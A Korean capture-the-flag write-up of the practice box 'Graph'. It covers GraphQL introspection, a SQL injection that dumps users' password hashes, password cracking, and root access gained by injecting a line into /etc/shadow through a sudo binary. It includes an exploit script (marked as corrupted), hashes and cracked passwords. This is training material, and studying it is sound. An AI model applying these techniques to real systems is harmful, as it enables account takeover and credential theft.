---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/web/graphql
  - tech/web/sqli
  - tech/cred/crack
  - tech/lin/sudo-abuse
type: machine
platform: pg
os: linux
ip: 192.168.248.201
ports: [22, 80]
services: [ssh, http]
status: solved
manual_tags: true
tech_count: 5
---

> [!info] Graph
> 타겟 192.168.248.201 · 호스트명 `graph` · Ubuntu 18.04 · PG Practice **Fundamental** · 플래그 2개
> tcp/80 Node.js/Express 앱의 GraphQL 엔드포인트 → introspection 으로 `users(searchTerm)` 필드 발견 → 인자에 주입해 admin/jane/josh 3계정의 sha512crypt 해시 전량 덤프 → john 으로 jane 해시 크랙(`oakland`) → SSH 로그인 → `sudo /usr/local/bin/pass-gen` 인자에 개행을 섞어 `/etc/shadow` 에 josh 행을 원본보다 «앞»에 주입 → josh 로 로그인 → root 해시 확보(읽어낸 명령 자체는 [가정]) → john 으로 root 해시 크랙(`espartaco`) → josh 셸에서 `su - root`.
> `/home/jane/local.txt` · `/root/proof.txt`

## 0. 이 박스에서 배우는 것

- **GraphQL introspection 이 곧 엔드포인트 지도**. 스키마를 몰라도 `__schema`/`__type` 질의 하나로 필드명·인자명·타입을 전부 뽑아낼 수 있음.
- **REST 웹 스캐너 사고를 그대로 GraphQL 에 쓰면 안 됨.** gobuster·probe 스크립트가 찾는 건 "경로" 인데, GraphQL 은 경로 하나(`/graphql` 류)에 쿼리 본문으로 전부 접근함. 경로 배치 프로빙은 **엔드포인트를 찾는 데만** 쓰고, 찾은 뒤에는 introspection 으로 전환해야 함.
- **응답 구조 자체가 취약점의 증거가 될 수 있음.** 정상 필터라면 이름만 나와야 할 자리에 `"jane"` 과 `"jane:$6$..."` 이 나란히 나온 것이 UNION 계열 주입의 전형적 흔적.
- **sha512crypt(`$6$`) 는 rockyou 로도 뚫림.** 해시 알고리즘이 강해도 비밀번호 자체가 약하면 무의미함(jane: `oakland`, root: `espartaco`). root 해시는 rockyou 로 **36초** 만에 떨어졌고, jane 쪽은 실행 시간이 기록되지 않았으나 해시 확보(14:53:20)에서 크랙(14:53:30)까지 10초 안이었음.
- **셸 하나를 잡았다고 끝이 아니라, 그 계정에 허용된 sudo 항목의 «구현»까지 봐야 함.** 이 박스의 대상은 스크립트가 아니라 **커스텀 바이너리**(`pass-gen`)라 소스를 못 봄. 대신 그 «결과»가 `/etc/shadow` 에 그대로 남아 메커니즘을 사후 복원할 수 있었음(4장) — **소스를 못 봐도 부작용을 관측하면 인과를 세울 수 있다**는 것이 이 박스의 실제 교훈임.
- **`/etc/shadow` 는 같은 이름의 행이 여러 개 있어도 오류가 아님.** 인증은 `getspnam()` 이 찾아낸 **첫 일치 행** 하나만 보므로, 원본보다 앞에 자기 해시를 끼워 넣으면 그 계정을 그대로 가져감. 필드에 개행을 넣을 수 있는 도구는 그 자체로 계정 탈취 수단임.
- **시험 출제 가능성**: GraphQL introspection + 인자 주입은 OSCP 최신 출제 경향(웹 API)과 맞닿아 있음. `__schema`/`__type` 질의 두 줄을 손에 익혀두는 것이 반사적으로 쓸모 있음.

## 1. 정찰

### Nmap

```
ssh kali@10.44.44.128 "nmap --privileged -Pn -n -sCV -p 22,80 -oN nmap-quick.txt 192.168.248.201"
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js Express framework
|_http-title: Welcome at Graph!
```
출처: `~/PG/Graph/nmap-quick.txt`

전체 포트(`-p-`)·UDP top-100 은 background 로 병행함(`.bg-fullscan.sh`). 전체 스캔 결과 **quick 과 동일하게 22·80 뿐**이었고(`nmap-full.txt`), UDP top100 은 445·518·1026·1028·1900·2222·3456·32769·49153·49188 이 전부 `closed` 로 나와 볼 것이 없었음(`nmap-udp-top100.txt`).

`Node.js Express framework` 배너가 곧 스택 힌트임 — PHP/WordPress 계열 점검(`.env`·`wp-login.php`·`phpinfo.php` 등)은 애초에 헛수고일 가능성이 높다는 뜻이고, 실제로 아래 probe 배치가 전부 그렇게 나왔음.

### SNMP — 헛짚은 벡터

```
onesixtyone 192.168.248.201 -c svc/snmp-communities.txt
```
```
Scanning 1 hosts, 5 communities
```
출처: `~/PG/Graph/svc/snmp-onesixtyone.txt` (`svc/snmp-communities.txt` = `public/private/community/manager/admin` 5종)

응답이 이 한 줄로 끝남 — **커뮤니티 문자열 5개 전부 무응답**. UDP 스캔에서도 161 은 `open` 으로 잡히지 않음. 다만 정확히 하면 161 은 위 `closed` 10개 목록에 없고 **응답이 없어 `open|filtered` 로 남은 90개** 쪽에 들어감(`nmap-udp-top100.txt`: `Not shown: 90 open|filtered udp ports (no-response)`) — 즉 "닫혀 있음이 확인된" 것이 아니라 "열려 있다는 근거가 없는" 상태임. `onesixtyone` 무응답과 합치면 실질적으로 빈손임. SNMP 는 이 박스에서 **완전한 빈손**이었고, 그 자체가 "UDP 스캔은 관례상 돌리되 초반에 미련 갖지 말 것"의 실례임.

### tcp/80 — 정적 파일 프로빙은 전부 404

```
ssh kali@10.44.44.128 "chromium --headless --no-sandbox --disable-gpu --hide-scrollbars --screenshot=shot_80_root.png --window-size=1280,900 http://192.168.248.201/"
```

![[PG-Graph-web80-landing.png]]

랜딩 페이지는 Bootstrap 템플릿("Welcome to Graph" + "Coming soon" 버튼). `whatweb` 도 `Bootstrap, HTML5, Script, X-Powered-By[Express]` 만 확인해줄 뿐 추가 정보는 없음(`web-80/whatweb.txt`).

`.env`·`.git/HEAD`·`package.json`·`composer.json`·`phpinfo.php`·`wp-login.php` 등 26개 경로를 배치로 찌름.

```
404 32  /robots.txt  -> probe_robots.txt
404 32  /sitemap.xml  -> probe_sitemap.xml
404 32  /CHANGELOG.md  -> probe_CHANGELOG.md
404 32  /CHANGELOG.txt  -> probe_CHANGELOG.txt
404 32  /CHANGELOG  -> probe_CHANGELOG
```
출처: `~/PG/Graph/web-80/probe-index.txt` 앞 5줄. 26줄 전부 `404 32` 로 동일함.

`web-80/probe-interesting.txt` 는 **0바이트임** — recon 스크립트가 `grep -E '^(200|401|403|301|302) '` 로 걸러 200/301/403 류만 추리는 필터인데, 여기 해당하는 줄이 **하나도 없었다는 뜻**임. 26개 전부 404, 크기까지 32바이트로 동일했음 — 앱이 미매칭 경로 전체에 돌려주는 `{"message":"404 page not found"}` 한 줄(정확히 32바이트)이 그대로 찍힌 것이고, `probe_admin_` 파일 내용도 같은 문자열임을 직접 확인함. **파일이 비어 있는 게 아니라 "찾은 게 없다"는 관측 결과가 파일로 남은 것**임.

`gobuster` 도 두 차례 돌림.

```
gobuster dir -u 'http://192.168.248.201:80/' -w '/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt' -k -t 30 -q --no-color --no-progress \
  -x php,txt,html,bak,zip,old -b 404,403 -o '/home/kali/PG/Graph/gobuster-80.txt'
```
출처: `~/PG/Graph/.bg-gobuster.sh` (recon 스크립트가 백그라운드로 던진 것)

이 작업이 확장자 6종(`php,txt,html,bak,zip,old`)까지 붙여 탐색 폭이 커, **14:52 시작 → 15:04 완료(약 12분)**가 걸림(`.bg-gobuster.sh` mtime 14:52:01 vs `gobuster-80.txt` mtime 15:04:53). 그 사이 손이 빈 게 아니라 — GraphQL 쪽 열거는 그 12분 안에 전부 끝남(아래 2장, gql/ 산출물이 14:52~14:53 사이 전부 생성됨). 다만 **14:54:47 에 `gobuster-raft.txt` 라는 또 한 번의 gobuster 결과가 별도로 남아 있음.**

```
/static              [Status: 301] [Size: 179] [--> /static/]
/Static              [Status: 301] [Size: 179] [--> /Static/]
/STATIC              [Status: 301] [Size: 179] [--> /STATIC/]
DONE
```
출처: `~/PG/Graph/gobuster-raft.txt`

이 출력엔 ANSI 컬러 코드가 살아 있고 끝에 `DONE` 이 찍혀 있음 — `.bg-gobuster.sh` 의 `--no-color` 옵션과 다름. **즉 별도로 수동 실행한 gobuster**임. 정확한 명령행은 산출물에 없어 워드리스트가 raft 계열이라는 것 외엔 **관측 없음**이지만, 결과는 배경 스캔과 완전히 동일했음(`/static`·`/Static`·`/STATIC` 3개, 대소문자 변형만 다른 같은 디렉터리). **12분짜리 배경 스캔이 끝나길 기다리는 대신 더 가벼운 스캔을 한 번 더 돌렸는데, 결과가 처음부터 같았음**(3분 안에 끝난 것으로 보아 확장자는 안 붙인 것으로 보임 — [가정]) — 배경 스캔이 이미 그 결과를 포함할 걸 알았다면 굳이 두 번 돌릴 필요는 없었음. `/static` 계열은 정적 자산 폴더일 뿐 그 이상의 의미는 없었음.

## 2. 취약점 분석 — GraphQL 인자 주입

### 엔드포인트를 찾는 과정

REST 스캐너 사고로 GraphQL 을 찾으려 함. `/graphql`·`/api/graphql`·`/graphiql`·`/playground`·`/console`·`/altair` 등 18개 후보 경로를 **배치로** GET 요청함.

배치 루프 자체는 파일로 남기지 않음. 아래는 `gql/GET_*.txt` **파일명 18개에서 역산한 재구성**임 — 실제로 친 명령행은 관측 없음.

```
for p in graphql api/graphql v1/graphql api graphiql playground query console gql \
         subscriptions v2/graphql api/v1/graphql graphql-explorer altair \
         graphql.php index.php graphql/console graphql/v1; do
  curl -s "http://192.168.248.201/$p" -o "gql/GET_${p//\//_}.txt"
done
```

대부분 위의 32바이트 404 JSON 을 그대로 돌려받음. 크기가 53바이트로 다른 것이 넷이었고, 내용은 전부 같았음.

```
{"errors":[{"message":"Must provide query string."}]}
```
출처: `gql/GET_graphql.txt`·`gql/GET_graphql_v1.txt`·`gql/GET_graphql_console.txt`·`gql/get_bare.txt` (넷 다 바이트 동일)

`Must provide query string` 은 GraphQL 엔진(예: `express-graphql`)이 **경로는 존재하지만 쿼리 파라미터가 없을 때** 내는 오류임 — 404 와 명확히 다른 이 문구가 곧 "여기 GraphQL 이 있다"는 신호임.

**[가정] 엔드포인트는 하나(`/graphql`)이고 나머지는 그 하위 경로임.** 저장 파일명이 `${p//\//_}` 로 `/` 를 `_` 로 바꾼 형태라 `GET_graphql_v1.txt` 가 `/graphql_v1` 에서 왔는지 `/graphql/v1` 에서 왔는지 파일명만으로는 구분되지 않음. 다만 `v1/graphql`·`api/graphql` 처럼 `graphql` 을 포함하는 다른 경로는 전부 404 였는데 이 둘만 응답한 것은, `app.use('/graphql', …)` 로 마운트된 핸들러가 **`/graphql` 과 그 하위 경로**를 함께 받는 것으로 보면 그대로 설명됨. `get_bare.txt` 는 같은 엔드포인트에 대한 재확인 요청으로 보이며(같은 응답, introspection 직전 시각) 별개 경로의 증거가 아님. 이후 작업은 `/graphql` 로 진행한 것으로 봄.

### Introspection

⚠️ 이 절과 다음 절의 `curl` 줄은 **응답 JSON 의 필드 구성에서 역산한 재구성**임. 산출물로 남은 것은 응답뿐이고 요청 본문은 기록되지 않음.

```
curl -s -X POST http://192.168.248.201/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{name kind}}}"}'
```
```
{"data":{"__schema":{"queryType":{"name":"Query"},"mutationType":null,
"types":[{"name":"Query","kind":"OBJECT"}, ... ]}}}
```
출처: `~/PG/Graph/gql/introspect_short.json`

`mutationType` 이 `null` — 쓰기 작업(계정 생성 등)은 이 스키마로 못 한다는 뜻이라, 처음부터 "읽기 쪽 필드에서 뭘 새어 나오게 할까"로 방향을 잡을 근거가 됨.

`Query` 타입의 필드를 다시 질의함.

```
curl -s -X POST http://192.168.248.201/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__type(name:\"Query\"){fields{name args{name type{name kind ofType{name}}}type{name kind ofType{name}}}}}"}'
```
```
{"data":{"__type":{"name":"Query","fields":[{"name":"users","description":null,
"args":[{"name":"searchTerm","type":{"name":null,"kind":"NON_NULL","ofType":{"name":"String"}}}],
"type":{"name":null,"kind":"LIST","ofType":{"name":"String"}}}]}}}
```
출처: `~/PG/Graph/gql/query_fields.json`

`Query` 에 필드가 **`users(searchTerm: String!): [String]` 하나뿐**임. 반환 타입이 객체가 아니라 **문자열 리스트**라는 점이 특이함 — 정상적인 스키마라면 `User { username, ... }` 같은 객체 타입을 돌려주는 게 자연스러운데, 여기는 그냥 문자열 배열임. 이 설계 자체가 뒤에서 "이름과 이름:해시가 같은 배열에 섞여 나오는" 현상과 맞물림.

### 왜 이 벡터인가 — 응답 구조가 스스로 증거를 남김

`searchTerm` 에 값을 채워 질의함.

```
curl -s -X POST http://192.168.248.201/graphql -H 'Content-Type: application/json' \
  -d '{"query":"query($s:String!){users(searchTerm:$s)}","variables":{"s":"<주입값>"}}'
```

⚠️ **`<주입값>` 의 정확한 문자열은 산출물에 없음 — 관측 없음.** `gql/dump_users.json` 에 남은 것은 **응답뿐**임.

```json
{"data":{"users":["admin","admin:$6$PRyGjElQ$unCSC/NlXu2KsYEjc1RuIqduAnPpPEwGg5diM4mZZbzhEWIWjhvlaoROBf5UgLWUFUFiEXSBjBmVENBbHO5oK/",
"jane","jane:$6$4BlcfbYDsQp3BMG$vwPo.Fpjadmz2jqPFPxrNusB8zCM2TBnNU1HuwkO9vWWvt3jFbpJ0ymelX/fyNgoLW9vQ/fJI0mL8vqw96HMX.",
"josh","josh:$6$g744Ii0AvY$Oce4aPVtE96encnfV5q1MboCBHyz74qw0R6d/iZKxIrHSFUtG3z7LfbAfHu1aoYRgbseH0tG3.nyGZ9qX1Ean."]}}
```
출처: `~/PG/Graph/gql/dump_users.json`, 브라우저 캡처는 `shot_graphql_sqli.png` (동일 내용, pretty-print 미체크 상태)

![[PG-Graph-graphql-sqli-hashdump.png]]

배열에 정확히 **6개**가 들어 있음 — `admin`/`jane`/`josh` 3개(순수 이름)와 `admin:해시`/`jane:해시`/`josh:해시` 3개(이름:해시 쌍). **[가정]** `searchTerm` 하나로 세 사용자 전원이 필터 없이 걸린 데다, 같은 이름이 "단독"과 "이름:해시 결합" 두 형태로 겹쳐 나온 것은 원래의 필터 질의(`WHERE username LIKE '%검색어%'` 류로 이름만 반환)에 **`UNION SELECT`** 로 이름과 해시를 이어붙인 두 번째 질의를 덧붙였을 때 나오는 전형적 모양임. 이름이 「단독 → 그 이름:해시」 순으로 번갈아 나오는 배치도 두 질의 결과를 합친 뒤 사전순으로 정렬하면 그대로 나옴(`admin` 이 `admin:$6$…` 의 접두라 먼저 옴). 다만 이건 응답 구조로부터의 추론이지, 요청 본문 자체를 남기지 않아 **정확한 주입 문법(어디에 `'` 를 넣었는지, `--`/`#` 주석 처리를 썼는지)은 확정할 수 없음.**

hashes.txt 는 이 응답에서 `이름:해시` 3줄만 뽑아 john 이 바로 먹을 수 있는 형식으로 만든 것임.

```
admin:$6$PRyGjElQ$unCSC/NlXu2KsYEjc1RuIqduAnPpPEwGg5diM4mZZbzhEWIWjhvlaoROBf5UgLWUFUFiEXSBjBmVENBbHO5oK/
jane:$6$4BlcfbYDsQp3BMG$vwPo.Fpjadmz2jqPFPxrNusB8zCM2TBnNU1HuwkO9vWWvt3jFbpJ0ymelX/fyNgoLW9vQ/fJI0mL8vqw96HMX.
josh:$6$g744Ii0AvY$Oce4aPVtE96encnfV5q1MboCBHyz74qw0R6d/iZKxIrHSFUtG3z7LfbAfHu1aoYRgbseH0tG3.nyGZ9qX1Ean.
```
출처: `~/PG/Graph/hashes.txt`

앱 소스 자체를 노리는 배치 시도(`s_app.js.txt`·`s_server.js.txt`·`s_package.json.txt`·`s_.git_HEAD.txt`·`s_static_*.txt`)도 같은 시각(14:53)에 돌렸으나 **전부 404** — Express 정적 서빙 경로 밖이라 소스는 못 봄.

## 3. Foothold — john 1차, jane 크랙

```
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
oakland          (jane)     
```
출처: `~/PG/Graph/john.out` (첫 줄 `Using default input encoding: UTF-8` 만 생략). **john 을 어떤 명령행으로 띄웠는지는 기록되지 않음** — 뒤의 root 크랙과 달리 `--session`/`--pot` 로그가 없어 워드리스트도 산출물에 안 남음.

**3개를 같이 태웠는데 jane 만 걸림.** 다만 이 출력에는 `Session completed` 가 없음 — 워드리스트를 끝까지 돈 것인지, jane 이 나온 시점에 끊고 넘어간 것인지는 산출물로 구분되지 않음(해시 정리 14:53:20 → 이 출력 14:53:30, 10초). 즉 **admin·josh 가 "안 깨진다"가 아니라 "이 실행에서는 안 나왔다"** 가 정확함(워드리스트는 산출물에 명시돼 있지 않으나 뒤의 `graphroot.log` 에서 root 크랙에 rockyou 를 쓴 것으로 보아 **[가정]** 여기서도 rockyou 였을 가능성이 높음). admin·josh 를 계속 태울지, jane 하나로 먼저 들어갈지 갈림길에서 **jane 하나로 SSH 를 시도하는 쪽을 택함** — 낮은 노력으로 셸 하나를 확보하는 게 우선이라는 판단임.

`oakland` 로 jane 의 SSH 로그인이 그대로 통함(호출 형태는 기록에 없음 — `proof_user.txt` 에 남은 것은 로그인 후의 MOTD·프롬프트·출력임).

```
jane@graph:~$ whoami; id; hostname; hostname -I; date; cat /home/jane/local.txt
jane
uid=1000(jane) gid=1000(jane) groups=1000(jane)
graph
192.168.248.201
Fri Aug 21 01:54:07 EDT 2026
754551935abdc3b2bdde424a9b5ccb66
jane@graph:~$
```
출처: `~/PG/Graph/proof_user.txt` 후반부(앞의 Ubuntu MOTD·`Last login` 배너는 생략). **타겟 pty 프롬프트(`jane@graph:~$`)가 실제로 캡처된 것 — 대화형 셸에서 원위치 `cat` 한 증거임.**

## 4. 권한상승 — jane → root

### jane 열거 — `sudo -l` 원문을 안 남김

셸을 잡자마자 `harvest.sh` 를 돌림(`harvest_jane.txt`·`harvest_jane_full.txt`, jane 권한, 비밀번호 없이).

```
===== SUDO =====
sudo: a password is required
(sudo -n 실패 — 비밀번호 필요)
```
출처: `~/PG/Graph/harvest_jane_full.txt`

`sudo -n` 은 당연히 실패함 — jane 의 비밀번호(`oakland`)는 이미 있으므로 **다시 물어야 하는 지점**임(Fikklish 와 같은 패턴). 하지만 **비밀번호를 넣은 `sudo -S -l` 의 실제 출력은 이 산출물 어디에도 없음.** `/usr/local/bin/pass-gen` 이라는 이름은 오직 `exploit_passgen.sh` 안의 **호출문**(`sudo /usr/local/bin/pass-gen "$PAY"`)으로만 등장함 — `harvest_jane_full.txt`·`harvest_root.txt` 어디에도 `pass-gen` 문자열이 없어 **`sudo -l` 원문은 관측 없음**임. 다만 그 호출의 «결과»가 타겟 `/etc/shadow` 에 그대로 남아 있으므로(아래), **jane 이 이 항목을 sudo 로 실행할 수 있었다는 사실 자체는 확정**임. 못 남긴 것은 허용 조건의 원문(NOPASSWD 여부·인자 제한)임.

같은 harvest 의 shadow 절도 확인함.

```
-- shadow (읽히면) --
```
출처: `~/PG/Graph/harvest_jane_full.txt` (이 줄 다음에 내용 없음)

**jane 은 `/etc/shadow` 를 직접 읽지 못함** — `groups=1000(jane)` 뿐이라 `shadow` 그룹이 아니고, harvest 스크립트가 시도한 `cat /etc/shadow`(읽히면 내용을 붙이는 구조)가 빈 결과를 남긴 것으로 이 부재를 뒷받침함.

### pass-gen 개행 주입 — 스크립트 사본은 «망가진» 것임

`~/PG/Graph/exploit_passgen.sh` 원문임. **코드펜스 안은 파일 바이트 그대로이며 한 글자도 고치지 않음.**

```bash
#!/bin/bash
# pass-gen 개행 주입 — jane 의 shadow 행 arr[4] 에 줄바꿈을 넣어 josh 행을 «앞»에 추가한다.
# josh 원행보다 먼저 오므로 getspnam 의 first-match 규칙에 따라 이쪽이 인증에 쓰인다.
H=.RO7QU80esZUwsLy5nnnB3a.Jq4Qp7wW0bWUJS.Wpg09a4.F0gbi5qIBj4LLi2cFgRPsfHkEkGm25F3/Z1
PAY=$99999:7:::njosh:"$H"$:19000:0:99999
echo "--- payload ---"; printf %sn "$PAY"; echo "--- who am i ---"; who am i
echo "--- shadow before ---"; ls -la /etc/shadow
sudo /usr/local/bin/pass-gen "$PAY"
echo "--- shadow after ---"; ls -la /etc/shadow
```
출처: `~/PG/Graph/exploit_passgen.sh` (전문)

⚠️ **이 사본을 그대로 따라 치면 동작하지 않음.** 손상 지점이 하필 익스플로잇의 핵심임(**[가정]** 원인은 파일을 원격에서 만들 때 이스케이프가 한 겹 먹힌 것). 추정이 아니라 **실제로 이 사본으로 돌린 실패의 잔재가 타겟 `/etc/shadow` 에 남아 있음** — 아래 `bogus` 행이 그것임.

- `PAY=` 행에 있어야 할 **개행(`\n`)이 리터럴 `n` 한 글자**로 남았음(`njosh`). 개행이 없으면 shadow 행이 끊기지 않아 주입이 성립하지 않음.
- `H=` 값에서 해시 접두 `$6$Gr4phSlt$PGF3` 이 통째로 빠짐 — 아래 `josh_hash.txt` 와 대조하면 그 자리만 비어 있음.
- `printf %sn` 도 원래 `printf '%s\n'` 이었을 자리임.
- **[가정]** 원본은 ANSI-C 인용(`PAY=$'…\n…'`)이었을 가능성이 높음. 홑따옴표와 백슬래시가 «함께» 사라진 형태가 그것과 맞고, 그렇게 보면 남은 `$`·`"` 위치도 설명됨.

이 파일은 **스크립트 소스일 뿐 실행 로그가 아님** — `echo`/`printf`/`ls -la` 의 출력은 저장되지 않음. 다만 실행 «결과»는 타겟 쪽에 남았고, 그것이 아래의 증거임.

의도한 메커니즘은 다음과 같음: `pass-gen` 이 대상 shadow 행의 5번째 필드(0-index 4, shadow 포맷상 `max`)에 사용자 인자를 그대로 꽂음. 그 인자에 개행이 들어가면 행이 중간에서 끊기고 뒤쪽이 **새 줄**이 됨. 새 줄을 `josh:$6$…:19000:0:99999` 형태로 맞추면 **진짜 josh 행보다 앞에** 오는 josh 항목이 하나 더 생김. `getspnam()` 은 이름이 일치하는 **첫 행**만 쓰므로, 인증에는 원래 해시 대신 심어 놓은 해시가 쓰임.

심을 해시는 `josh_hash.txt` 임.

```
$6$Gr4phSlt$PGF3.RO7QU80esZUwsLy5nnnB3a.Jq4Qp7wW0bWUJS.Wpg09a4.F0gbi5qIBj4LLi2cFgRPsfHkEkGm25F3/Z1
```
출처: `~/PG/Graph/josh_hash.txt`

`exploit_passgen.sh` 의 `H` 변수는 이 해시에서 `$6$Gr4phSlt$PGF3` 접두를 뗀 나머지와 **바이트 단위로 일치함.** salt 가 `Gr4phSlt`(그래프+솔트를 연상시키는 값)로 무작위가 아니라 사람이 고른 문자열이라는 것도, 이게 **원격에서 새어 나온 해시가 아니라 Kali 에서 직접 만든 해시**라는 정황임 — 즉 공격자가 자신이 아는 평문의 sha512crypt 해시를 미리 만들어 josh 행에 심으려 한 것임. **GraphQL 로 덤프한 josh 해시(`$6$g744Ii0AvY$Oce4…`)와는 다른 값**이라는 점이 이를 뒷받침함 — 덤프에서 가져온 것이 아니라 새로 만든 것임. 다만 **그 평문이 무엇이었는지는 기록되지 않음**(해시를 생성한 명령 자체가 산출물에 없음).

### 실행 결과 — 타겟 shadow 에 그대로 남음

`harvest_root.txt` 의 「USERS」절에 shadow 전문이 들어 있음. 이 harvest 는 **복원 «전»** 인 타겟 시각 02:08:47 에 돌아서, 공격으로 바뀐 상태를 그대로 담고 있음.

```
jane:$6$32320834$CYv6J3o8vCo9wN3IiCSkZeQ68JujU3hiJpO3yz6xHuyuzdrbCCwomlgEVqVzFaUPnlqSLUelPKzSGIKlnD7q7.:19831:0:99999:7:::
josh:$6$Gr4phSlt$PGF3.RO7QU80esZUwsLy5nnnB3a.Jq4Qp7wW0bWUJS.Wpg09a4.F0gbi5qIBj4LLi2cFgRPsfHkEkGm25F3/Z1:19000:0:99999:7:::
bogus:!:0:0:99999:7:::njosh:.RO7QU80esZUwsLy5nnnB3a.Jq4Qp7wW0bWUJS.Wpg09a4.F0gbi5qIBj4LLi2cFgRPsfHkEkGm25F3/Z1$:19000:0:99999:7:::
josh:$6$TD5XkGNtP4IHiEWB$t8dCH9af03gRDABH8OulhJDd1KDIbGmU3D83XsjA.hJSU7pLUaWU89xtc7C4EFW3L8oqLTQ2n1NkWN2QMp4vp0:19078:0:99999:7:::
josh:$6$xA4CCC7YQzDl40A$3lCVdpI59TEDZRqIKdFWB4daOmFq3FSgESYnhDNpiZRlitXs17G.HFKXmq2eMkoWJLC0xGPL2DRxJXupo/Orf1:19078:0:99999:7:::
josh:$6$K5zpw246$b9gY23O4mdsnWK.tMyofVScVrRoYBUVcnDhz97ikf.MHgHJJdLdz2ibFAUf4ZXVzeZXGAKdryMTuG9WSv6aW90:19129:0:99999:7:::
node:!:19129:0:99999:7:::
```
출처: `~/PG/Graph/harvest_root.txt` 「USERS」절 shadow 부분(시스템 계정 행 생략, 위 7줄이 파일 끝까지 연속)

여기서 세 가지가 한꺼번에 읽힘.

- **jane 행의 `max` 필드가 `1337` → `99999` 로 바뀌었고 해시도 재생성됨**(복원본과 대조 — 아래). `pass-gen` 이 인자를 shadow 필드에 그대로 꽂는다는 것이 실측으로 확인된 지점임.
- **바로 다음 줄이 심어 놓은 `josh:$6$Gr4phSlt$…` 행임.** 인자의 개행이 실제로 파일을 끊었다는 뜻이고, 이 행은 박스 원본의 josh 행 3개보다 **앞**에 있음 — `getspnam()` 첫 일치 규칙에서 이기는 위치임. **주입은 성공함.**
- **`bogus:` 로 시작하는 줄은 개행이 «안» 들어간 실행의 잔재임.** 리터럴 `njosh` 와 접두 없는 해시가 `exploit_passgen.sh` 의 손상된 문자열과 **정확히 일치**함 — 즉 Kali 에 남은 그 스크립트 사본은 **실패한 쪽**이고, 성공한 실행에서 쓴 온전한 페이로드는 따로 저장되지 않음. 이 `bogus` 계정은 복원본에 없으므로 작업 중에 생긴 것임.

`cleanup_evidence_box.txt` 의 복원 기록이 대조군이 됨.

```
c0ba3f99dc0981eeeb7617c6155da121  /etc/shadow
1688 /etc/shadow
--- restore candidate ---
1433 /tmp/s.restore
34
--- after restore ---
8503a26a3ddfa3cbf7e8c0d6de7607eb  /etc/shadow
1433 /etc/shadow
-rw-r----- 1 root shadow 1433 Aug 21 02:11 /etc/shadow
jane:$6$41234567$UopOgp8jETVNueXnCycGNoUfGyjLiG6sWjY2KqtbmrUicBcxFivIfOrymqt1cxt3FGLLYEw35wv1I.f76oBLA1:19831:0:1337:7:::
```
출처: `~/PG/Graph/cleanup_evidence_box.txt` — 복원 후 목록 중 root·josh 3행·node 행은 생략했다(josh 3행은 위 harvest 인용과 같은 값, root 행은 아래 `root_hash.txt` 와 같은 값).

**복원 전 1688바이트 → 복원 후 1433바이트.** 차이 255바이트가 작업 중 `/etc/shadow` 에 들어갔던 분량이고, md5 도 함께 바뀜. 백업본 `/tmp/s.restore` 에는 `Gr4phSlt` 행도 `bogus` 행도 없으므로 **이 백업은 조작 이전 상태**이며, 따라서 거기 있는 **josh 행 3개는 박스가 원래 갖고 있던 것**임(첫 일치 규칙이 이 박스의 의도된 관문이라는 정황). jane 행의 `max` 가 여기서는 `1337`, 조작 후에는 `99999` 인 것이 앞의 대조 근거임.

### josh → root

`harvest_root.txt` 의 프로세스 트리가 root 를 잡은 경로를 그대로 보여줌.

```
root      3255  0.0  0.7 107992  7108 ?        Ss   02:07   0:00  \_ sshd: josh [priv]
josh      3335  0.0  0.3 107992  3464 ?        S    02:07   0:00      \_ sshd: josh@pts/1
josh      3336  0.0  0.4  22684  4988 pts/1    Ss   02:07   0:00          \_ -bash
root      3348  0.0  0.3  63052  3852 pts/1    S    02:08   0:00              \_ su - root
root      3349  0.0  0.5  22656  5112 pts/1    S    02:08   0:00                  \_ -su
root      3376  0.0  0.1   4636  1732 pts/1    S+   02:08   0:00                      \_ sh /tmp/.h.sh
```
출처: `~/PG/Graph/harvest_root.txt` 「PROCS」절(`ps auxf`)

**josh 로 SSH 로그인(타겟 02:07) → 그 pty 안에서 `su - root`(02:08).** root 셸은 별도 SSH 세션이 아니라 josh 세션의 자식이고, 맨 아래 `sh /tmp/.h.sh` 가 이 harvest 자신임. 이 로그인에 쓰인 비밀번호는 **심어 놓은 쪽일 수밖에 없음** — 박스 원본의 josh 해시는 크랙된 적이 없음(1차 john 에서 나온 것은 jane 뿐이고, `root.pot` 에도 root 항목 하나뿐임).

root 해시는 그보다 앞서 파일로 떨어짐.

```
root:$6$4kpaRzOQ$mG9wRaxktdkRgXRVp4tyZkNYub/95YRuZ7P8AybjSGsBCh/0HotsXCq77XI6LOcZfn.lxIzc4NOaHvkROXRMa/
```
출처: `~/PG/Graph/root_hash.txt`

⚠️ **[가정] 이 파일을 어떤 세션에서 만들었는지는 관측 없음.** 생성 시각이 Kali 15:05:47(타겟 02:05:44)로 **위 josh SSH 세션(02:07)보다 앞섬.** jane 은 shadow 를 못 읽으므로, 그 전에 이미 josh 로 갈아탄 세션이 따로 있었고 그것이 종료돼 `ps` 에 남지 않은 것으로 보는 편이 자연스러움(jane 셸에서의 `su josh` 라면 sshd 프로세스도 안 생김). **josh 가 shadow 를 읽을 수 있었던 근거(그룹 소속·sudo 항목)는 어느 산출물에도 없음** — harvest 가 `/etc/group` 을 뜨지 않음.

john 크랙은 여기서부터 다시 두 번 걸림.

```
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Crash recovery file is locked: /home/kali/.john/john.rec
```
출처: `~/PG/Graph/john_root.out` (첫 줄 `Using default input encoding: UTF-8` 과 래퍼가 붙인 끝줄 `DONE_ROOT` 생략). 세션 이름을 주지 않은 실행이었다는 것은 실패 문구 자체가 말해 주지만, **명령행은 기록되지 않음** — 재실행 쪽만 `graphroot.log` 에 남음.

